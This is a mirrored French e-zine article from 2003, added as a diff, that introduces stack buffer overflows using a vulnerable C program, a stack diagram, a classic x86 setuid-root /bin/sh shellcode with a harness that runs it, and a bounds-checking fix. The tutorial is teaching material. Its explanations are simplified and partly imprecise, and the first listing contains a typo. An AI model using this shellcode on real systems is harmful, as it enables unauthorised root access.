@@ -1,0 +1,442 @@
+<html>
+
+
+<!-- Mirrored from frenchezines.free.fr/tries/espiozine/1/buffersoverflows.html by HTTrack Website Copier/3.x [XR&CO'2007], Thu, 07 Aug 2008 03:04:43 GMT -->
+<head>
+<link href="http://frenchezines.free.fr/tries/espiozine/1/espionet.css" rel="stylesheet" type="text/css">
+<title>Index</title>
+<base target="_self">
+</head>
+
+<body bgcolor="#000000">
+
+<div align="center">
+  <table border="0" width="90%" cellspacing="0" bgcolor="#003300">
+    <tr>
+      <td width="100%" align="left">
+        <table border="0" width="100%" bgcolor="#001100" cellspacing="0" cellpadding="3">
+          <tr>
+              <td width="100%"> 
+                <p align="center" class="texte">&nbsp;
+                <div align="center">
+                  <center>
+                  <table border="0" width="384" bgcolor="#006600" cellspacing="0">
+                    <tr>
+                      <td width="380">
+                        <table border="0" width="384" bgcolor="#003300" cellspacing="0">
+                          <tr>
+                            <td width="100%">
+                              <p align="center" class="texte"><b><font color="#FFFFFF" size="4">Introduction aux buffers overflow</font></b></p></td>
+                          </tr>
+                        </table>
+                      </td>
+                    </tr>
+                  </table>
+                  </center>
+                </div>
+                <p class="texte">&nbsp;<span lang="FR"><font color="#FFFFFF"><br>
+                Voici
+                le sommaire de cet article :<br>
+                <br>
+                </font></span>
+                </p>
+                <div align="center">
+                  <center>
+                  <table border="0" width="95%" cellspacing="0" cellpadding="0">
+                    <tr>
+                      <td width="100%" class="texte">
+                <font color="#FFFFFF"><span lang="FR"><b><u><o:p></u></b><a href="#0"><b><u>0) Introduction</u></b></a>
+                <p><a href="#1"><b><u>1) Que fait ce programme ?</u></b></a></p>
+                <p><a href="#2"><b><u>2) En quoi ce programme est-il vulnérable ?</u></b></a></p>
+                <p><a href="#3"><b><u>3) Explication shématiquement au niveau de la pile</u></b></a></p>
+                <p><a href="#4"><b><u>4) Qu'est-ce qu'un shellcode ?</u></b></a></p>
+                <p><a href="#5"><b><u>5) Comment sécuriser ce programme ?</u></b></a></p>
+                <p><a href="#6"><b><u>6) Infos</u></b></a></p>
+                <p><a href="#7"><b><u>7) Remerciements</u></b></a></span></font></td>
+                    </tr>
+                  </table>
+                  </center>
+                </div>
+                <p align="left" class="texte">&nbsp; <p align="center" class="texte"><font color="#FFFFFF"><span lang="FR">-----------------------------------------------------------------------</span></font> <p align="left" class="texte"><font color="#FFFFFF"><b><u><a name="0">0) Introduction</a></u></b></font> <p align="left" class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                Dans cet article destiné à l'EspioZine, je vais vous parler des buffers 
+overflow ainsi que des dangers de ceux-ci. Je vais tenter de vous expliquer leur 
+fonctionnement par le biais d'un programme en C. Nous allons l'appeler bof.c :</font> <p align="left" class="texte">&nbsp;
+                <div align="center">
+                  <center>
+                  <table border="0" width="80%" cellspacing="0" bgcolor="#003300">
+                    <tr>
+                      <td width="100%">
+                        <table border="0" width="100%" bgcolor="#000000" cellspacing="0" cellpadding="2">
+                          <tr>
+                            <td width="100%">
+                              <p class="texte"><font color="#FFFFFF">/**********************<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                              bof.c<br>
+                              &nbsp;*********************/<br>
+                              <br>
+                              <br>
+                              #include&lt;stdio.h&gt;<br>
+                              <br>
+                              #include&lt;string.h&gt;<br>
+                              <br>
+                              <br>
+                              main(int argc, char *argv[])<br>
+                              {&nbsp;&nbsp; char buffer[5];<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp; if (argc &gt; 1)<br>
+                              <br>
+                              &nbsp;&nbsp;&nbsp;&nbsp; strcpy(buffur,argv[1]);<br>
+                              <br>
+                              }</font></td>
+                          </tr>
+                        </table>
+                      </td>
+                    </tr>
+                  </table>
+                  </center>
+                </div>
+<pre class="texte">&nbsp;</pre>
+<pre class="texte"><font color="#FFFFFF"><b><u><a name="1">1) Que fait ce programme ?</a></u></b></font></pre>
+                <p class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                Voici la source commentée afin de l'expliquer:</font></p>
+                <div align="center">
+                  <center>
+                  <table border="0" width="80%" bgcolor="#003300" cellspacing="0">
+                    <tr>
+                      <td width="100%">
+                        <table border="0" width="100%" bgcolor="#000000" cellspacing="0" cellpadding="2">
+                          <tr>
+                            <td width="100%">
+                              <p class="texte"><font color="#FFFFFF">/* déclaration
+                              des arguments */<br>
+                              main(int argc, char *argv[])<br>
+                              {&nbsp;&nbsp; /* définition de la variable buffer
+                              */<br>
+                              &nbsp;&nbsp;&nbsp; char buffer[5];<br>
+                              &nbsp;&nbsp;&nbsp; /* si un argument est passé */<br>
+                              &nbsp;&nbsp;&nbsp; if (argc &gt; 1)<br>
+                              &nbsp;&nbsp;&nbsp; /* insère le dans la variable
+                              buffer */<br>
+                              &nbsp;&nbsp;&nbsp; strcpy(buffer,argv[1]);<br>
+                              }</font></td>
+                          </tr>
+                        </table>
+                      </td>
+                    </tr>
+                  </table>
+                  </center>
+                </div>
+<p class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Comme on peut le voir, la variable buffer est conçue pour supporter 
+  5 caractères. Maintenant imaginons que celle-ci viendrait à déborder 
+  car un trop gros argument serait passé. Mais d'abord, combien de caractères 
+  faut-il pour produire l'overflow ? Pour le savoir, compilez le programme bof.c 
+  puis faites :</font></p>
+                <div align="center">
+                  <center>
+                  <table border="0" width="80%" bgcolor="#003300" cellspacing="0">
+                    <tr>
+                      <td width="100%">
+                        <table border="0" width="100%" bgcolor="#000000" cellspacing="0" cellpadding="2">
+                          <tr>
+                            <td width="100%">
+                              <p class="texte"><font color="#FFFFFF">C:\&gt;bof
+                              aaaaa</font></td>
+                          </tr>
+                        </table>
+                      </td>
+                    </tr>
+                  </table>
+                  </center>
+                </div>
+<p class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Rien ne passe. Ajoutez donc un 'a' en plus. S'il ne se passe toujours rien, 
+  répétez cette opération jusqu'à qu'un message d'erreur 
+  apparaisse (environ au 10ème 'a').</font></p>
+<p class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Que s'est-il passé ? Le 10ème caractère à débordé. 
+  Tout d'abord, rappelons ce qu'est une variable en C afin de mieux comprendre 
+  à quoi est dû l'overflow.</font></p>
+                <div align="center">
+                  <center>
+                  <table border="0" width="80%" bgcolor="#003300" cellspacing="0">
+                    <tr>
+                      <td width="100%">
+                        <table border="0" width="100%" bgcolor="#000000" cellspacing="0" cellpadding="2">
+                          <tr>
+                            <td width="100%">
+                              <p class="texte"><font color="#FFFFFF">Variable:
+                              Une ~ est un espace mémoire que le programme réserve
+                              lors de son exécution.&nbsp;<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                              Cet espace mémoire varie en fonction du type de
+                              variable. Il correspond à un certains nombre
+                              d'octets.</font></td>
+                          </tr>
+                        </table>
+                      </td>
+                    </tr>
+                  </table>
+                  </center>
+                </div>
+<p class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Pour résumer, un buffer overflow se produit lorsque l'argument passé 
+  dépasse le nombre d'octets alloué à la variable.</font></p>
+<p class="texte">&nbsp;</p>
+<p class="texte"><font color="#FFFFFF"><b><u><a name="2">2) En quoi ce programme est-il vulnérable ?</a></u></b></font></p>
+                <p class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                Comme on a pu le constater, au bout d'un certain nombre de caractères, 
+un buffer overflow se produit. Imaginons que jusqu'au point de rupture (à 
+la limite du nombre d'octet), on envoie des lettres (des 'A' par exemple comme 
+dans l'exemple plus haut) et qu'au point de rupture, on envoie un shellcode. Le 
+shellcode sera donc en overflow et sera interprété par le système. 
+Nous obtiendrons ainsi l'accès root.</font>
+                <p class="texte">&nbsp;</p>
+                <p class="texte"><font color="#FFFFFF"><b><u><a name="3">3) Explication shématiquement au niveau de la pile</a></u></b></font></p>
+                <p class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                Schémas de la pile STACK</font></p>
+                <div align="center">
+                  <center>
+                  <table border="0" width="80%" bgcolor="#003300" cellspacing="0">
+                    <tr>
+                      <td width="100%">
+                        <table border="0" width="100%" bgcolor="#000000" cellspacing="0" cellpadding="2">
+                          <tr>
+                            <td width="100%" valign="top"><pre class="texte">&nbsp;</pre>
+                              <table border="0" width="100%" cellspacing="0">
+                                <tr>
+                                  <td width="10%" valign="top"></td>
+                                  <td width="20%" bgcolor="#003300" valign="top">
+                                    <table border="0" width="100%" cellspacing="0" cellpadding="0" bgcolor="#001100" height="100%">
+                                      <tr>
+                                        <td width="100%" class="texte" valign="top">
+                                          <p align="center"><font color="#FFFFFF"><br>
+                                          Données débordant étant donc
+                                          exécutées<br>
+                                          <br>
+                                          -------------------<br>
+                                          <br>
+                                          Pile<br>
+                                          STACK<br>
+                                          <br>
+                                          </font></td>
+                                      </tr>
+                                    </table>
+                                  </td>
+                                  <td width="70%" valign="top" class="texte"><br>
+                                    &nbsp; <font color="#FFFFFF">&lt;----- les
+                                    données qui déborderont seront une requête<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                                    d'exécution de /bin/sh (shellcode)<br>
+                                    <br>
+                                    <br>
+                                    &nbsp; &lt;----- point de rupture (ici à
+                                    environ 10 caractères)<br>
+                                    <br>
+                                    &nbsp; &lt;----- nous envoyons des 'A' pour
+                                    faire saturer.<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                                    partie réservée à la mémoire tampon<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                                    (ici à 10 caractères)</font></td>
+                                </tr>
+                              </table>
+                              <p class="texte">&nbsp;</td>
+                          </tr>
+                        </table>
+                      </td>
+                    </tr>
+                  </table>
+                  </center>
+                </div>
+                <pre class="texte">&nbsp;</pre>
+                <pre class="texte"><font color="#FFFFFF"><u><b><a name="4">4) Qu'est-ce qu'un shellcode ?</a></b></u></font></pre>
+                <p class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                Un shellcode est une suite d'instruction permettant d'exécuter du code 
+afin d'obtenir un accès root ou de mettre en place un shell (pour la plupart 
+des cas). Il correspond à une série de 'jump' et de 'push' (en ASM 
+: assembleur);</font> 
+<p class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Voici le shellcode que j'ai décidé d'exécuter (ici en C):</font> </p>
+                <div align="center">
+                  <center>
+                  <table border="0" width="80%" bgcolor="#003300" cellspacing="0">
+                    <tr>
+                      <td width="100%">
+                        <table border="0" width="100%" bgcolor="#000000" cellspacing="0" cellpadding="2">
+                          <tr>
+                            <td width="100%">
+                              <p class="texte"><font color="#FFFFFF">char
+                              shellcode[] =<br>
+                              &nbsp;&nbsp;&nbsp; &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80&quot;
+                              /* setuid(0) */<br>
+                              &nbsp;&nbsp;&nbsp; &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;<br>
+                              &nbsp;&nbsp;&nbsp;
+                              &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;<br>
+                              &nbsp;&nbsp;&nbsp; &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;</font></td>
+                          </tr>
+                        </table>
+                      </td>
+                    </tr>
+                  </table>
+                  </center>
+                </div>
+<p class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Il a pour but d'exécuter /bin/sh et de nous donner l'accès root.</font></p>
+<p class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Il n'est pas nécessaire de trouver un programme 'souffrant' d'une vulnérabilité 
+  buffer overflow pour envoyer un shellcode. Le programme ci-dessous s'en chargera 
+  tout seul :</font></p>
+                <div align="center">
+                  <center>
+                  <table border="0" width="80%" bgcolor="#003300" cellspacing="0">
+                    <tr>
+                      <td width="100%">
+                        <table border="0" width="100%" bgcolor="#000000" cellspacing="0" cellpadding="2">
+                          <tr>
+                            <td width="100%">
+                              <p class="texte"><font color="#FFFFFF">#include
+                              &lt;unistd.h&gt;<br>
+                              #include &lt;stdio.h&gt;<br>
+                              <br>
+                              int main()<br>
+                              {&nbsp;&nbsp; char * name [] = {&quot;/bin/sh&quot;,
+                              NULL};<br>
+                              &nbsp;&nbsp;&nbsp; execve (name [0], name, NULL);<br>
+                              &nbsp;&nbsp;&nbsp; _exit(0);<br>
+                              }</font></td>
+                          </tr>
+                        </table>
+                      </td>
+                    </tr>
+                  </table>
+                  </center>
+                </div>
+<p class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Son fonctionnement est tout simple : il exécuter /bin/sh !</font></p>
+<p class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Le shellcode peut aussi être directement intégré au programme :</font> </p>
+                <div align="center">
+                  <center>
+                  <table border="0" width="80%" bgcolor="#003300" cellspacing="0">
+                    <tr>
+                      <td width="100%">
+                        <table border="0" width="100%" bgcolor="#000000" cellspacing="0" cellpadding="2">
+                          <tr>
+                            <td width="100%">
+                              <p class="texte"><font color="#FFFFFF">char
+                              shellcode[] =<br>
+                              &nbsp;&nbsp;&nbsp; &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80&quot;<br>
+                              &nbsp;&nbsp;&nbsp; &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;<br>
+                              &nbsp;&nbsp;&nbsp;
+                              &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;<br>
+                              &nbsp;&nbsp;&nbsp; &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;<br>
+                              <br>
+                              int main()<br>
+                              {&nbsp;&nbsp; int * ret;<br>
+                              &nbsp;&nbsp;&nbsp; seteuid(getuid());<br>
+                              &nbsp;&nbsp;&nbsp; * ((int *) &amp; ret + 2) = (int)
+                              shellcode;<br>
+                              &nbsp;&nbsp;&nbsp; return (0);<br>
+                              }</font></td>
+                          </tr>
+                        </table>
+                      </td>
+                    </tr>
+                  </table>
+                  </center>
+                </div>
+<pre class="texte">&nbsp;</pre>
+<pre class="texte"><font color="#FFFFFF"><b><u><a name="5">5) Comment sécuriser ce programme ?</a></u></b></font></pre>
+                <p class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                Un moyen de le protéger sans toucher au code source est d'appliquer 
+  le patch 'grsec' et d'utiliser la 'libsafe'. Ceci à pour effet d'empêcher 
+  le dépassement de la mémoire.<br><br>
+                </font><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                Une autre méthode consisterait à modifier le code source de ce programme.<br>
+                <br>
+                </font>
+                <div align="center">
+                  <center>
+                  <table border="0" width="80%" bgcolor="#003300" cellspacing="0">
+                    <tr>
+                      <td width="100%">
+                        <table border="0" width="100%" bgcolor="#000000" cellspacing="0" cellpadding="2">
+                          <tr>
+                            <td width="100%">
+                              <p class="texte"><font color="#FFFFFF">#include
+                              &lt;string.h&gt;<br>
+                              #include &lt;stdio.h&gt;<br>
+                              #define SATURATION 512<br>
+                              <br>
+                              main(int argc, char *argv[])<br>
+                              {&nbsp;&nbsp;&nbsp; printf(&quot;Arguments
+                              passes... &quot;);<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp; if (argc &gt; 1)<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;
+                              printf(&quot;Oui\n&quot;);<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                              printf(&quot;Taille reglementaire... &quot;);<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                              if (strlen(argv[1]) &lt; SATURATION)<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                              {&nbsp;&nbsp;&nbsp; char buffer[512];<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                              strcpy(buffer,argv[1]);<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                              printf(&quot;Oui\n&quot;);<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                              _exit(0);<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                              }<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                              else<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                              {&nbsp;&nbsp;&nbsp; printf(&quot;Non\n&quot;);<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                              _exit(0);<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                              }<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp; }<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp; else<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;
+                              printf(&quot;Aucuns\n&quot;);<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                              _exit(0);<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp; }<br>
+                              }</font></td>
+                          </tr>
+                        </table>
+                      </td>
+                    </tr>
+                  </table>
+                  </center>
+                </div>
+<pre class="texte">&nbsp;</pre> 
+<pre class="texte"><font color="#FFFFFF"><b><u><a name="6">6) Infos</a></u></b></font></pre> 
+                <p class="texte"><font color="#FFFFFF">
+  Cet article a été écrit pour l'EspioZine.<br>
+  Fait le: 05/10/2003<br>
+  Auteur: Isothop<br>
+  Website: <a href="http://www.darkalpha.com/" target="_blank">Darkalpha.com</a></font>
+                <p class="texte">&nbsp;</p>
+                <p class="texte"><font color="#FFFFFF"><b><u><a name="7">7) Remerciements</a></u></b></font></p>
+                <p class="texte"><font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                Je remercie Nocte, l'admin de <a href="http://dealerhacksecurity.free.fr/" target="_blank">DHS</a> 
+pour tous ce qu'il m'a apprit sur le sujet par le biais de ses défis.</font>
+                <p class="texte" style="mso-pagination:none;mso-layout-grid-align:none;
+text-autospace:none" align="center"><font color="#FFFFFF"><span lang="FR">-----------------------------------------------------------------------</span></font> </p>
+ <p align="center" class="texte">&nbsp;
+                <p align="right" style="text-align:right;mso-pagination:none;
+mso-layout-grid-align:none;text-autospace:none" class="texte"><font color="#FFFFFF"> Isothop</font></p>
+                <p align="right" style="text-align:right;mso-pagination:none;
+mso-layout-grid-align:none;text-autospace:none" class="texte"><font color="#ffffff"><span lang="FR"><u><b>Pour
+                me contacter :</b></u></span></font></p>
+                <p align="right" style="text-align:right;mso-pagination:none;
+mso-layout-grid-align:none;text-autospace:none" class="texte"><font color="#FFFFFF">Isothop
+                : <a href="mailto:isothop@darkalpha.com">isothop@darkalpha.com</a><span lang="FR">&nbsp;<br>
+                <o:p></o:p><o:p>
+                </span></font></p>
+                </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+  </table>
+</div>
+
+</body>
+
+
+<!-- Mirrored from frenchezines.free.fr/tries/espiozine/1/buffersoverflows.html by HTTrack Website Copier/3.x [XR&CO'2007], Thu, 07 Aug 2008 03:04:43 GMT -->
+</html>
